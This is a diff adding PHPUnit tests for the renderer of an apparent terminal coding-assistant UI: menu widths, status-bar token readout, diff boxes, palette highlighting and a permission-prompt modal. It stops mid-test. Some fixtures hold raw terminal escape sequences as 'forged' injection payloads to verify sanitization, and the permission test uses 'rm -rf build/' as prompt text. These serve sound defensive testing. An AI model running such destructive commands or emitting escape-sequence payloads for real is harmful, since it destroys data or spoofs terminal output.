+     *   clipped the description. Every width collected below is asserted.
+     *
+     * The BOX width (`Width::string()` of the row with its border and padding)
+     * is the invariant that matters for collision, and it is asserted against
+     * the terminal at every width. It is not `assertLessThanOrEqual($cols)` for
+     * the WHOLE frame because the status bar is separately over-wide at narrow
+     * terminals - 54 columns at any width below that, measured, pre-existing,
+     * and nothing to do with this popup.
+     */
+    public function testSlashMenuFitsTheWholeRowNotJustTheHint(): void
+    {
+        // The popup box, and the box only: the input box below it also contains
+        // the '/websearch' draft, so the "▸" marker is what identifies the row.
+        // Rows re-measured at CL-3: the budget gained the shell's 6 columns, so
+        // every width below shows six more cells of hint/description than the
+        // pre-CL-3 table did; 120 is unchanged because the natural row fits.
+        $expected = [
+            20 => '▸ /websearch — …',
+            30 => '▸ /websearch — Search the…',
+            40 => '▸ /websearch — Search the web via S…',
+            60 => '▸ /websearch <query> [--sa… — Search the web via SearXNG',
+            80 => '▸ /websearch <query> [--safesearch 0|1|2] [--t… — Search the web via SearXNG',
+            100 => '▸ /websearch <query> [--safesearch 0|1|2] [--time-range day|month|… — Search the web via SearXNG',
+            120 => '▸ /websearch <query> [--safesearch 0|1|2] [--time-range day|month|year] — Search the web via SearXNG',
+        ];
+
+        foreach ($expected as $cols => $row) {
+            $out = Renderer::render(
+                (new Chat(history: [Message::user('hi')], inputBuf: '/websearch'))->withSize($cols, 30)
+            );
+
+            $box = 0;
+            $found = null;
+            foreach (explode("\n", $out) as $line) {
+                $plain = (string) preg_replace('/\x1b\[[0-9;]*m/', '', $line);
+                if (str_contains($plain, '▸ /websearch')) {
+                    $box = Width::string($plain);
+                    // stripBox()'s /u regex rather than trim(): trim()'s
+                    // charlist is byte-based, and "│" and "▸" share a leading
+                    // 0xE2 byte, so trimming the border eats the marker's
+                    // first byte and the row stops being valid UTF-8.
+                    $found = self::stripBox($plain);
+                }
+            }
+
+            $this->assertNotNull($found, "the \"/\" popup was not rendered at {$cols} columns");
+            $this->assertSame($row, $found, "the popup row at {$cols} columns");
+            $this->assertLessThanOrEqual(
+                $cols,
+                $box,
+                "the popup box (border and padding included) must fit a {$cols}-column terminal, "
+                . 'or render() paints it over the row below',
+            );
+        }
+
+        // The three claims the exact rows above encode, said out loud so a
+        // future edit to a description reads as a description change rather
+        // than as a width regression.
+        $this->assertStringContainsString(
+            '/websearch <query> [--safesearch 0|1|2] [--time-range day|month|year] — Search',
+            $expected[120],
+            'at 120 columns the whole hint fits',
+        );
+        $this->assertStringContainsString('…', $expected[60], 'at 60 the hint is truncated, not dropped');
+        $this->assertStringNotContainsString('month', $expected[60]);
+        $this->assertStringNotContainsString(
+            '<query>',
+            $expected[40],
+            'at 40 there is no room for a hint at all, so the description gets every column the name leaves',
+        );
+    }
+
+    public function testSlashMenuNotRenderedOnceArgumentsStart(): void
+    {
+        $out = Renderer::render($this->chat(buf: '/rename foo'));
+        $this->assertStringNotContainsString('▸', $out);
+    }
+
+    public function testDifferentThemesProduceDifferentOutput(): void
+    {
+        $dark = new Chat(history: [Message::user('hi')], themeName: 'dark');
+        $dracula = new Chat(history: [Message::user('hi')], themeName: 'dracula');
+
+        $this->assertNotSame(Renderer::render($dark), Renderer::render($dracula));
+    }
+
+    public function testShortConversationIsPaddedToFullTerminalHeight(): void
+    {
+        $rows = \SugarCraft\Code\Tui\Renderer::getTerminalSize()['rows'];
+        $out = Renderer::render($this->chat());
+
+        $this->assertCount($rows, explode("\n", $out));
+    }
+
+    /**
+     * Regression: sugar-core's Renderer repaints a changed row via an
+     * ABSOLUTE cursorTo($row, 1) - once a frame is taller than the real
+     * terminal, every row past the terminal's last line gets clamped there
+     * by the terminal itself, so distinct rows (input box, status bar,
+     * newest history) all collide on that one physical row. The frame must
+     * never exceed $rows lines regardless of how long history gets. Forces
+     * an explicit small size via WindowSizeMsg rather than the ambient
+     * terminal's real size, both for a deterministic assertion and to
+     * prove Renderer reads Chat::rows() (see that method's docblock for why
+     * a second, independent terminal-size query is exactly the bug this
+     * guards against).
+     */
+    public function testLongConversationIsClippedToFullTerminalHeightNotLeftUnbounded(): void
+    {
+        $rows = 20;
+        $history = [];
+        for ($i = 0; $i < $rows * 3; $i++) {
+            $history[] = Message::user("message {$i}");
+        }
+        [$sized] = $this->chat($history)->update(new \SugarCraft\Core\Msg\WindowSizeMsg(80, $rows));
+
+        $out = Renderer::render($sized);
+
+        $this->assertCount($rows, explode("\n", $out));
+    }
+
+    /**
+     * The tail of history - not the head - must survive clipping: the
+     * newest turn and the input box (rendered after history) need to stay
+     * visible, with older turns scrolling off the top instead.
+     */
+    public function testLongConversationClippingKeepsTheMostRecentMessageVisible(): void
+    {
+        $rows = 20;
+        $history = [];
+        for ($i = 0; $i < $rows * 3; $i++) {
+            $history[] = Message::user("message {$i}");
+        }
+        [$sized] = $this->chat($history)->update(new \SugarCraft\Core\Msg\WindowSizeMsg(80, $rows));
+
+        $out = Renderer::render($sized);
+
+        $this->assertStringContainsString('message ' . ($rows * 3 - 1), $out);
+        $this->assertStringNotContainsString('message 0' . "\n", $out);
+    }
+
+    /**
+     * Renderer must lay out against whatever size Chat was actually told
+     * via WindowSizeMsg, not the ambient terminal TuiRenderer::getTerminalSize()
+     * happens to detect for THIS process - the two can legitimately differ
+     * (a resize Chat received but the cached detector never re-queried).
+     */
+    public function testRendererUsesChatsWindowSizeNotAmbientTerminalDetection(): void
+    {
+        [$sized] = $this->chat()->update(new \SugarCraft\Core\Msg\WindowSizeMsg(80, 15));
+
+        $out = Renderer::render($sized);
+
+        $this->assertCount(15, explode("\n", $out));
+    }
+
+    public function testStatusBarIsTheLastLineAndIncludesContextPercent(): void
+    {
+        $out = Renderer::render($this->chat());
+        $lines = explode("\n", $out);
+        $lastLine = preg_replace('/\x1b\[[0-9;]*m/', '', (string) end($lines));
+
+        $this->assertMatchesRegularExpression('/\(\d+%\)/', $lastLine);
+        $this->assertStringContainsString('Enter to send', $lastLine);
+    }
+
+    /**
+     * F.CTXK: a bare percentage is unactionable without knowing the budget,
+     * so the bar carries the absolute count in K next to it. Would fail
+     * against the old "37% context · …" bar, which printed no count at all.
+     */
+    public function testStatusBarShowsAbsoluteTokenCountBesideThePercentage(): void
+    {
+        $history = [];
+        for ($i = 0; $i < 200; $i++) {
+            $history[] = Message::user(str_repeat('x', 400));
+        }
+        $chat = $this->chat($history);
+        [$sized] = $chat->update(new \SugarCraft\Core\Msg\WindowSizeMsg(120, 40));
+
+        $lastLine = $this->statusBar(Renderer::render($sized));
+
+        // 200 messages x (400 chars / 4 + 10 role overhead) = 22,000 ESTIMATED
+        // tokens against the 100,000-token fallback window: this fixture's Chat
+        // holds the default EchoBackend, which reports no window, so
+        // ContextWindow::FALLBACK_TOKENS is the denominator. On a real provider
+        // it would be that provider's advertised window and the percentage
+        // would differ - see
+        // {@see \SugarCraft\Code\Tests\Integration\ContextWindowWiringTest}.
+        $this->assertSame(22000, $chat->contextTokens());
+        $this->assertSame(100000, $chat->contextTokenLimit());
+        $this->assertStringContainsString('~22K / 100K context (22%)', $lastLine);
+    }
+
+    /**
+     * The COUNT is a chars/4 proxy, not a tokenizer figure, so it is prefixed
+     * rather than presented as a measurement.
+     *
+     * The limit beside it is no longer in the same boat: since crush_code.md
+     * Phase 5 item 4 it IS the model's advertised context window whenever the
+     * backend can report one, so the reason for the `~` narrowed to the
+     * left-hand number and the mismatch between the two units. It has not gone
+     * away - this fixture's EchoBackend reports no window, so the limit here is
+     * ContextWindow::FALLBACK_TOKENS.
+     */
+    public function testAbsoluteTokenCountIsLabelledAsAnEstimate(): void
+    {
+        [$sized] = $this->chat()->update(new \SugarCraft\Core\Msg\WindowSizeMsg(120, 40));
+
+        $this->assertMatchesRegularExpression('/~[\d.]+K \/ [\d.]+K context/', $this->statusBar(Renderer::render($sized)));
+    }
+
+    /**
+     * The bar is the frame's last line and may never wrap, so the readout
+     * degrades to narrower forms instead of pushing the row over the width.
+     */
+    public function testStatusBarNeverExceedsTerminalWidthAsTheReadoutGrows(): void
+    {
+        $history = [];
+        for ($i = 0; $i < 400; $i++) {
+            $history[] = Message::user(str_repeat('x', 4000));
+        }
+
+        foreach ([120, 80, 70, 60] as $cols) {
+            [$sized] = $this->chat($history)->update(new \SugarCraft\Core\Msg\WindowSizeMsg($cols, 40));
+
+            $lastLine = $this->statusBar(Renderer::render($sized));
+
+            $this->assertLessThanOrEqual($cols, Width::of($lastLine), "overflowed at {$cols} cols");
+            // However narrow, the percentage itself is never dropped.
+            $this->assertMatchesRegularExpression('/\d+%/', $lastLine);
+        }
+    }
+
+    /**
+     * Below ~60 columns the bar's fixed help text ("Enter to send · Ctrl+P
+     * menu · /exit or ^C to quit", ~52 columns with its separator) overflows
+     * on its own — a pre-existing limit this step does not change. What is
+     * asserted here is that the context readout contributes its minimum in
+     * that case: the bare percentage, never a wider form.
+     */
+    public function testContextReadoutCollapsesToTheBarePercentageOnANarrowTerminal(): void
+    {
+        $history = [];
+        for ($i = 0; $i < 200; $i++) {
+            $history[] = Message::user(str_repeat('x', 400));
+        }
+        [$sized] = $this->chat($history)->update(new \SugarCraft\Core\Msg\WindowSizeMsg(40, 40));
+
+        $this->assertStringStartsWith('22% · ', $this->statusBar(Renderer::render($sized)));
+    }
+
+    /** The final status-bar row, with SGR sequences and zone markers stripped. */
+    private function statusBar(string $frame): string
+    {
+        $lines = explode("\n", $frame);
+        $plain = preg_replace('/\x1b\[[0-9;]*m/', '', (string) end($lines));
+
+        return (string) preg_replace('/\x{E000}\/?[A-Za-z0-9._:-]*\x{E001}/u', '', (string) $plain);
+    }
+
+    public function testPaletteNotRenderedWhenClosed(): void
+    {
+        $out = Renderer::render($this->chat());
+        $this->assertStringNotContainsString('New session', $out);
+    }
+
+    public function testPaletteRendersOverACompositedBackdropWhenOpen(): void
+    {
+        $chat = $this->chat();
+        [$opened] = $chat->update(new KeyMsg(KeyType::Char, 'p', ctrl: true));
+
+        $out = Renderer::render($opened);
+
+        $this->assertStringContainsString('New session', $out);
+        $this->assertStringContainsString('Exit', $out);
+    }
+
+    // =========================================================================
+    // crush_feat.md §1 E3 (rendering half): Edit/Write diffs in the transcript
+    // =========================================================================
+
+    /** A Chat with a pinned viewport so width/height clipping is deterministic. */
+    private function sizedChat(array $history, int $cols = 80, int $rows = 40): Chat
+    {
+        return new Chat(history: $history, rows: $rows, cols: $cols);
+    }
+
+    private function editResult(string $diff): Message
+    {
+        return Message::assistant('')->withToolResults([
+            new \SugarCraft\Code\ToolResult(
+                name: 'Edit',
+                result: 'File updated: src/App.php',
+                id: 'call_edit',
+                diff: $diff,
+            ),
+        ]);
+    }
+
+    /** @return list<string> visible (ANSI-stripped) lines of a rendered frame */
+    private function visibleLines(string $frame): array
+    {
+        return array_map(
+            static fn (string $line): string => (string) preg_replace('/\x1b\[[0-9;]*[A-Za-z]/', '', $line),
+            explode("\n", $frame),
+        );
+    }
+
+    /**
+     * The step-defining regression: before §1 E3's rendering half, a ToolResult
+     * carrying a unified diff rendered as "🔧 tool: Edit ✓ ok / File updated: …"
+     * and the diff was silently dropped. Every assertion below fails against
+     * that renderer.
+     */
+    public function testEditToolDiffIsRenderedInTheTranscript(): void
+    {
+        $diff = "--- a/src/App.php\n+++ b/src/App.php\n@@ -1,3 +1,3 @@\n <?php\n-\$old = 1;\n+\$new = 2;\n";
+        $out = Renderer::render($this->sizedChat([Message::user('edit it'), $this->editResult($diff)]));
+
+        $this->assertStringContainsString('tool: Edit', $out);
+        $this->assertStringContainsString('@@ -1,3 +1,3 @@', $out);
+        $this->assertStringContainsString('-$old = 1;', $out);
+        $this->assertStringContainsString('+$new = 2;', $out);
+    }
+
+    /**
+     * Additions/removals are colour-coded, and the `---`/`+++` file headers
+     * must NOT be mistaken for a whole-file removal/addition.
+     */
+    public function testDiffMarkersAreColourCodedAndFileHeadersAreNot(): void
+    {
+        $diff = "--- a/src/App.php\n+++ b/src/App.php\n@@ -1 +1 @@\n-gone\n+here\n";
+        $chat = $this->sizedChat([$this->editResult($diff)]);
+        $theme = $chat->theme();
+
+        $out = Renderer::render($chat);
+
+        $added = Style::new()->foreground(Color::ansi(2))->render('+here');
+        $removed = Style::new()->foreground(Color::ansi(1))->render('-gone');
+        $header = Style::new()->foreground($theme->systemLabel)->bold()->render('--- a/src/App.php');
+
+        $this->assertStringContainsString($added, $out);
+        $this->assertStringContainsString($removed, $out);
+        $this->assertStringContainsString($header, $out);
+        $this->assertStringNotContainsString(
+            Style::new()->foreground(Color::ansi(1))->render('--- a/src/App.php'),
+            $out,
+        );
+    }
+
+    /**
+     * crush_code.md Phase 8 item 1: the diff box used to say what changed but
+     * never where. Each row now carries an old-file/new-file line-number
+     * gutter, and the numbers have to be the file's, not the diff block's.
+     */
+    public function testDiffRowsCarryOldAndNewFileLineNumbers(): void
+    {
+        $diff = "--- a/src/App.php\n+++ b/src/App.php\n@@ -40,3 +40,3 @@\n <?php\n-\$old = 1;\n+\$new = 2;\n";
+        $lines = $this->visibleLines(Renderer::render($this->sizedChat([$this->editResult($diff)])));
+
+        $find = static function (string $needle) use ($lines): string {
+            foreach ($lines as $line) {
+                if (str_contains($line, $needle)) {
+                    return $line;
+                }
+            }
+            return '';
+        };
+
+        // Context sits on line 40 of both files; the edit is line 41 of each.
+        $this->assertMatchesRegularExpression('/40 40│  <\?php/', $find('<?php'));
+        $this->assertMatchesRegularExpression('/41\s+│ -\$old = 1;/', $find('-$old = 1;'));
+        $this->assertMatchesRegularExpression('/\s+41│ \+\$new = 2;/', $find('+$new = 2;'));
+        // File/hunk headers have no line to point at, but keep the column.
+        $this->assertMatchesRegularExpression('/\s+│ @@ -40,3 \+40,3 @@/', $find('@@ -40,3'));
+    }
+
+    /**
+     * The gutter is painted separately from the diff body so the body's own
+     * add/remove SGR bytes stay exactly what they were before a gutter existed
+     * -- otherwise every colour assertion above would have had to be loosened.
+     */
+    public function testTheGutterIsStyledSeparatelyFromTheDiffBody(): void
+    {
+        $diff = "--- a/x\n+++ b/x\n@@ -1 +1 @@\n-gone\n+here\n";
+        $chat = $this->sizedChat([$this->editResult($diff)]);
+        $theme = $chat->theme();
+        $out = Renderer::render($chat);
+
+        $gutterStyle = Style::new()->foreground($theme->systemLabel);
+        $this->assertStringContainsString(
+            $gutterStyle->render('  1│ ') . Style::new()->foreground(Color::ansi(2))->render('+here'),
+            $out,
+        );
+    }
+
+    /**
+     * A viewport too narrow to spare the columns keeps the diff text and drops
+     * the gutter rather than truncating every row back to its marker.
+     */
+    public function testANarrowViewportDropsTheGutterInsteadOfTheDiffText(): void
+    {
+        $diff = "--- a/x\n+++ b/x\n@@ -1 +1 @@\n-gone\n+here\n";
+        $out = Renderer::render($this->sizedChat([$this->editResult($diff)], cols: 30));
+
+        $this->assertStringContainsString('+here', $out);
+        $this->assertStringNotContainsString('1│', $out);
+    }
+
+    /**
+     * Render invariant: one logical line per physical row. A diff line wider
+     * than the viewport must be truncated, never wrapped -- sugar-core's
+     * Renderer repaints by absolute row, so a wrapped line shifts every row
+     * below it.
+     */
+    public function testOverWideDiffLinesAreTruncatedToTheViewportWidth(): void
+    {
+        $diff = "--- a/x\n+++ b/x\n@@ -1 +1 @@\n+" . str_repeat('x', 400) . "\n";
+        $out = Renderer::render($this->sizedChat([$this->editResult($diff)], cols: 80));
+
+        foreach ($this->visibleLines($out) as $line) {
+            $this->assertLessThanOrEqual(80, mb_strlen($line), 'over-wide row: ' . $line);
+        }
+    }
+
+    /**
+     * Render invariant: a huge diff must not evict the conversation it belongs
+     * to, so the block is capped and the remainder reported as a count.
+     */
+    public function testLongDiffIsClippedWithARemainingLineCount(): void
+    {
+        $body = '';
+        for ($i = 1; $i <= 40; $i++) {
+            $body .= "+line {$i}\n";
+        }
+        $diff = "--- a/x\n+++ b/x\n@@ -0,0 +1,40 @@\n" . $body;
+
+        $out = Renderer::render($this->sizedChat([$this->editResult($diff)], rows: 60));
+
+        $this->assertStringContainsString('+line 1', $out);
+        // 43 diff rows, capped at 24 -> 19 reported as remaining.
+        $this->assertStringContainsString('19 more diff lines', $out);
+        $this->assertStringNotContainsString('+line 40', $out);
+    }
+
+    /**
+     * The PR #1403 failure class, reached through TAB.
+     *
+     * sugar-core's Sanitize::untrusted() preserves TAB and Width::string("\t")
+     * is 0, but sugar-style' Style::render() paints each tab as tabWidth
+     * spaces -- so a Go/Makefile/C diff was budgeted 0 cells per tab and
+     * painted 4, and the box emitted rows wider than the viewport. sugar-core's
+     * Renderer repaints by absolute row and clamps cursorTo(), so an over-wide
+     * row lands on the status bar.
+     *
+     * Measured with Width::string(Ansi::strip()) rather than strlen: the whole
+     * bug is that byte count and display width disagree.
+     */
+    public function testTabIndentedDiffRowsNeverExceedTheRequestedWidth(): void
+    {
+        $render = new \ReflectionMethod(Renderer::class, 'renderDiff');
+        $render->setAccessible(true);
+        $theme = $this->chat()->theme();
+
+        $fixtures = [
+            'makefile' => "--- a/Makefile\n+++ b/Makefile\n@@ -1,3 +1,3 @@\n build:\n-\techo old\n+\techo new\n",
+            'go'       => "--- a/m.go\n+++ b/m.go\n@@ -5,4 +5,4 @@\n func f() {\n-\t\treturn 1\n+\t\treturn 2\n }\n",
+            'deep'     => "--- a/x\n+++ b/x\n@@ -1,2 +1,2 @@\n-\t\t\t\tdeeply nested tabbed line\n+\t\t\t\tdeeply nested tabbed lino\n",
+            'cjk-tab'  => "--- a/x\n+++ b/x\n@@ -1,2 +1,2 @@\n-\t日本語のテキスト\n+\t\t中文文本在这里\n",
+            'emoji'    => "--- a/x\n+++ b/x\n@@ -1,2 +1,2 @@\n-\t🧑‍🚀🧑‍🚀 astronauts 👨‍👩‍👧‍👦\n+\t\t👍🏽 ok\n",
+            'raw-esc'  => "--- a/x\n+++ b/x\n@@ -1,2 +1,2 @@\n-\x1b[31mforged\x1b[0m\n+\x1b[1;32m\tforged\x1b[0m\n",
+            'six-digit' => "--- a/x\n+++ b/x\n@@ -999999,3 +999999,3 @@\n ctx\n-\told\n+\tnew\n",
+        ];
+
+        foreach ($fixtures as $name => $diff) {
+            // 13 upward: below that the pre-existing max(8, $width - 4) floor
+            // makes the box a fixed 12 cells regardless of the request.
+            for ($width = 13; $width <= 120; $width++) {
+                foreach (explode("\n", $render->invoke(null, $diff, $theme, $width)) as $row) {
+                    $this->assertLessThanOrEqual(
+                        $width,
+                        Width::string(Ansi::strip($row)),
+                        "{$name} at width {$width}: " . Ansi::strip($row),
+                    );
+                }
+            }
+        }
+    }
+
+    /**
+     * The same invariant through the real render() path, at the two widths
+     * either side of the gutter-drop boundary and at DIFF_MIN_BODY_COLS.
+     */
+    public function testATabIndentedDiffFitsTheFrameAcrossTheGutterDropBoundary(): void
+    {
+        $diff = "--- a/Makefile\n+++ b/Makefile\n@@ -1,3 +1,3 @@\n build:\n-\techo old\n+\techo new\n";
+
+        foreach ([80, 100, 120] as $cols) {
+            foreach (explode("\n", Renderer::render($this->sizedChat([$this->editResult($diff)], cols: $cols))) as $row) {
+                $this->assertLessThanOrEqual(
+                    $cols,
+                    Width::string(Ansi::strip($row)),
+                    "cols {$cols}: " . Ansi::strip($row),
+                );
+            }
+        }
+    }
+
+    /** Tabs are expanded, not dropped -- the indentation still reads as depth. */
+    public function testTabIndentationSurvivesAsSpaces(): void
+    {
+        $diff = "--- a/Makefile\n+++ b/Makefile\n@@ -1,2 +1,2 @@\n build:\n-\techo old\n";
+        $out = Renderer::render($this->sizedChat([$this->editResult($diff)]));
+
+        $this->assertStringContainsString('-    echo old', $out);
+        $this->assertStringNotContainsString("\t", $out);
+    }
+
+    /**
+     * `--` opens a comment in SQL, Lua, Haskell and Ada, so a deleted
+     * `-- users table` arrives as `--- users table` and used to be coloured as
+     * a bold file header instead of a red removal. The verdict now comes from
+     * DiffGutter::fileHeaders(), which knows whether a hunk is open, so the
+     * colour and the line number can no longer disagree about what a row is.
+     */
+    public function testADeletedCommentRowIsColouredAsARemovalNotAFileHeader(): void
+    {
+        $diff = "--- a/schema.sql\n+++ b/schema.sql\n@@ -10,3 +10,3 @@\n CREATE TABLE users (\n--- users table, legacy\n";
+        $chat = $this->sizedChat([$this->editResult($diff)]);
+        $theme = $chat->theme();
+
+        $out = Renderer::render($chat);
+
+        $this->assertStringContainsString(
+            Style::new()->foreground(Color::ansi(1))->render('--- users table, legacy'),
+            $out,
+        );
+        $this->assertStringNotContainsString(
+            Style::new()->foreground($theme->systemLabel)->bold()->render('--- users table, legacy'),
+            $out,
+        );
+        // The genuine header above it is still a header.
+        $this->assertStringContainsString(
+            Style::new()->foreground($theme->systemLabel)->bold()->render('--- a/schema.sql'),
+            $out,
+        );
+    }
+
+    /**
+     * Diff bodies are verbatim file contents. A raw ESC in an edited file
+     * would otherwise forge SGR straight onto the terminal wire.
+     */
+    public function testDiffContentIsSanitizedBeforeDisplay(): void
+    {
+        $diff = "--- a/x\n+++ b/x\n@@ -1 +1 @@\n+payload\x1b[31mRED\x07\n";
+        $out = Renderer::render($this->sizedChat([$this->editResult($diff)]));
+
+        $this->assertStringContainsString('payloadRED', $out);
+        $this->assertStringNotContainsString("\x07", $out);
+    }
+
+    /** A result with no diff keeps the pre-E3 rendering exactly as it was. */
+    public function testToolResultWithoutADiffRendersNoDiffBox(): void
+    {
+        $out = Renderer::render($this->sizedChat([
+            Message::assistant('')->withToolResults([
+                \SugarCraft\Code\ToolResult::ok('calculator', '42', 'call_1'),
+            ]),
+        ]));
+
+        $withDiff = Renderer::render($this->sizedChat([
+            $this->editResult("--- a/x\n+++ b/x\n@@ -1 +1 @@\n-a\n+b\n"),
+        ]));
+
+        $this->assertStringContainsString('tool: calculator', $out);
+        // The input box is the only Border::normal() box in a diff-free frame;
+        // a rendered diff adds a second one.
+        $this->assertSame(1, substr_count($out, '┌'));
+        $this->assertSame(2, substr_count($withDiff, '┌'));
+    }
+
+    // =========================================================================
+    // crush_feat.md §4 E3/E6/E7: palette highlighting, grouping, MRU order
+    // =========================================================================
+
+    /**
+     * A visible line with the surrounding box-drawing frame and padding
+     * removed. Uses a /u regex rather than trim(): trim()'s character list
+     * is byte-based, so "│" and "▸" share a leading 0xE2 byte and trimming
+     * the former would eat the latter's first byte.
+     */
+    private static function stripBox(string $line): string
+    {
+        return (string) preg_replace('/^[\s│╭╮╰╯─]+|[\s│╭╮╰╯─]+$/u', '', $line);
+    }
+
+    /** An open palette, optionally with $query already typed into it. */
+    private function openPalette(string $query = ''): Chat
+    {
+        [$current] = $this->chat()->update(new KeyMsg(KeyType::Char, 'p', ctrl: true));
+        foreach (str_split($query) as $ch) {
+            [$current] = $current->update(new KeyMsg(KeyType::Char, $ch));
+        }
+
+        return $current;
+    }
+
+    /**
+     * §4 E3: the matched run carries its own SGR (bold + underline) inside
+     * the row, and the row still reads as plain text once ANSI is stripped.
+     */
+    public function testPaletteHighlightsTheMatchedRunOfATypedQuery(): void
+    {
+        $out = Renderer::render($this->openPalette('them'));
+
+        $row = '';
+        foreach (explode("\n", $out) as $line) {
+            if (str_contains(preg_replace('/\x1b\[[0-9;]*m/', '', $line), 'Switch theme')) {
+                $row = $line;
+            }
+        }
+
+        $this->assertNotSame('', $row, 'the matching palette row was not rendered');
+        // "them" of "Switch theme" is wrapped in its own styled run; the "e"
+        // after it is NOT part of that run.
+        $this->assertMatchesRegularExpression('/\x1b\[[0-9;]*4[;m][^m]*m?them/', $row);
+        $this->assertStringContainsString('them', $row);
+        $this->assertStringContainsString(
+            'Switch theme',
+            preg_replace('/\x1b\[[0-9;]*m/', '', $row),
+        );
+    }
+
+    /**
+     * A highlighted run ends in a full SGR reset, so the row style has to be
+     * re-opened behind it - otherwise everything after the match renders in
+     * the terminal's default colour instead of the row's.
+     */
+    public function testPaletteReopensTheRowStyleAfterAHighlightedRun(): void
+    {
+        $out = Renderer::render($this->openPalette('them'));
+
+        $row = '';
+        foreach (explode("\n", $out) as $line) {
+            if (str_contains(preg_replace('/\x1b\[[0-9;]*m/', '', $line), 'Switch theme')) {
+                $row = $line;
+            }
+        }
+
+        // …them<reset><row-style>e…  — a reset immediately followed by an SGR
+        // colour re-open, not by bare text.
+        $this->assertMatchesRegularExpression('/them\x1b\[0m(\x1b\[[0-9;]*m)+e/', $row);
+    }
+
+    /** §4 E6: the empty-query palette carries a header per category. */
+    public function testEmptyQueryPaletteRendersCategoryHeaders(): void
+    {
+        $lines = $this->visibleLines(Renderer::render($this->openPalette()));
+        $trimmed = array_map(self::stripBox(...), $lines);
+
+        $this->assertContains('Session', $trimmed);
+        $this->assertContains('Appearance', $trimmed);
+        // A header is a bare category name; the rows under it keep their
+        // "▸ "/"  " markers, so the label and its header never collide.
+        $this->assertContains('▸ New session', $trimmed);
+    }
+
+    /** A typed query is a flat relevance list — no headers to break the ranking. */
+    public function testQueriedPaletteOmitsCategoryHeaders(): void
+    {
+        $lines = $this->visibleLines(Renderer::render($this->openPalette('them')));
+        $trimmed = array_map(self::stripBox(...), $lines);
+
+        $this->assertNotContains('Appearance', $trimmed);
+        $this->assertContains('▸ Switch theme', $trimmed);
+    }
+
+    /** Theme/provider lists have no categories, so they render ungrouped. */
+    public function testThemeListPaletteRendersWithoutHeaders(): void
+    {
+        $chat = new Chat(palette: new \SugarCraft\Code\Palette\PaletteState('themes', '', 0));
+
+        $lines = $this->visibleLines(Renderer::render($chat));
+        $trimmed = array_map(self::stripBox(...), $lines);
+
+        $this->assertContains('▸ dark', $trimmed);
+        $this->assertContains('dracula', $trimmed);
+        $this->assertNotContains('Appearance', $trimmed);
+    }
+
+    /** §4 E7: a recently-run row renders at the top of the reopened palette. */
+    public function testRecentlyUsedRowRendersFirst(): void
+    {
+        $chat = new Chat(
+            palette: \SugarCraft\Code\Palette\PaletteState::root(),
+            paletteMru: ['Switch theme'],
+        );
+
+        $rows = [];
+        foreach ($this->visibleLines(Renderer::render($chat)) as $line) {
+            $trimmed = self::stripBox($line);
+            if (str_starts_with($trimmed, '▸ ') || in_array($trimmed, ['Switch session', 'Exit'], true)) {
+                $rows[] = $trimmed;
+            }
+        }
+
+        $this->assertSame('▸ Switch theme', $rows[0]);
+    }
+
+    // =========================================================================
+    // crush_feat.md §1 E2 (rendering half): the permission-prompt modal
+    // =========================================================================
+
+    /**
+     * Park a real blocking permission prompt on a Chat by dispatching the same
+     * Msg the ASK path dispatches, rather than hand-constructing the state.
+     */
+    private function chatAwaitingPermission(
+        string $prompt = 'Run rm -rf build/?',
+        array $arguments = ['description' => 'Delete the build directory'],
+        string $toolName = 'Bash',
+        int $cols = 80,
+        int $rows = 40,
+        ?\SugarCraft\Code\Backend\PendingAsk $pendingAsk = null,
+    ): Chat {
+        [$blocked] = $this->sizedChat([Message::user('clean up')], $cols, $rows)->update(
+            new \SugarCraft\Code\PermissionRequestMsg(
+                Message::assistant(''),
+                new \SugarCraft\Code\ToolCall($toolName, $arguments, 'call_1'),
+                $prompt,
+                null,
+                $pendingAsk,
+            ),
+        );
+
+        return $blocked;
+    }
+
+    /** An engine-path prompt for the gate's own question, which offers `always`. */
+    private function chatAwaitingGateAsk(): Chat
+    {
+        $arguments = ['command' => 'git status', 'description' => 'Show the working tree status'];
+
+        return $this->chatAwaitingPermission('Allow Bash to run? (permission mode: default)', $arguments, pendingAsk: new \SugarCraft\Code\Backend\PendingAsk(
+            \SugarCraft\Code\Backend\PendingAsk::askId('call_1', 'Bash', $arguments),
+            'call_1',
+            'Bash',
+            $arguments,
+            'Allow Bash to run? (permission mode: default)',
+            'gate',
+            'default',
+            ['once', 'always', 'reject'],
+            ['tool' => 'Bash'],
+            static function (): void {
+            },
+        ));
+    }
+
+    /**
+     * R4 (the residual of audit 15b-09): the permission modal's inner width
+     * was floored at 20, so under 26 columns the box was wider than the
+     * terminal and the overlay clip cut off its right border. A blocking
+     * prompt whose frame is broken reads as a rendering fault at exactly the
+     * moment the user has to read it. From 7 columns up, where the bordered
+     * shell itself fits, the whole box fits.
+     */
+    public function testThePermissionModalKeepsItsRightBorderOnANarrowTerminal(): void
+    {
+        foreach (range(7, 30) as $cols) {
+            // Tall, so the box (one wrapped cell per row at 7 columns) is not
+            // cut at the bottom, which is a height matter and not this one.
+            $rows = explode("\n", Ansi::strip(Renderer::render(
+                $this->chatAwaitingPermission(cols: $cols, rows: 100),
+            )));
+
+            foreach ($rows as $i => $row) {
+                $this->assertLessThanOrEqual($cols, Width::string($row), "cols {$cols}: row {$i} is wider than the terminal");
+            }
+            $bottom = array_values(array_filter($rows, static fn(string $row): bool => str_contains($row, '╰')));
+            $this->assertNotSame([], $bottom, "cols {$cols}: the modal's bottom border is missing");
+            $this->assertStringContainsString('╯', end($bottom), "cols {$cols}: the modal lost its right border");
+        }
+    }
+
+    /**
+     * The step-defining regression: before this half of §1 E2 landed, a Chat
+     * could park a turn on `pendingPermission()` and the renderer drew nothing
+     * at all - the user saw a frozen "thinking…" frame with no question, no
+     * options and no way to know a keypress was expected. Every assertion here
+     * fails against that renderer.
+     */
+    public function testPermissionPromptIsRenderedAsAModal(): void
+    {
+        $out = Renderer::render($this->chatAwaitingPermission());
+
+        $this->assertStringContainsString('permission required', $out);
+        $this->assertStringContainsString('Bash', $out);
+        $this->assertStringContainsString('Delete the build directory', $out);
+        $this->assertStringContainsString('Run rm -rf build/?', $out);
+    }
+
+    /**
+     * Exactly the keys Chat::handlePermissionKey() accepts while the prompt is
+     * ARMED, and no others.
+     *
+     * The `a` label now says it ASKS rather than allows, because that is what
+     * the key does: it raises the confirm below. A modal still promising a
+     * one-keystroke session grant would read as a bug the first time someone
+     * pressed it.
+     */
+    public function testPermissionPromptAdvertisesTheThreeAnswerKeys(): void
+    {
+        $out = Renderer::render($this->chatAwaitingGateAsk());
+
+        $this->assertStringContainsString('allow once', $out);
+        // The `a` row names what it would remember (SessionPermissionMemo).
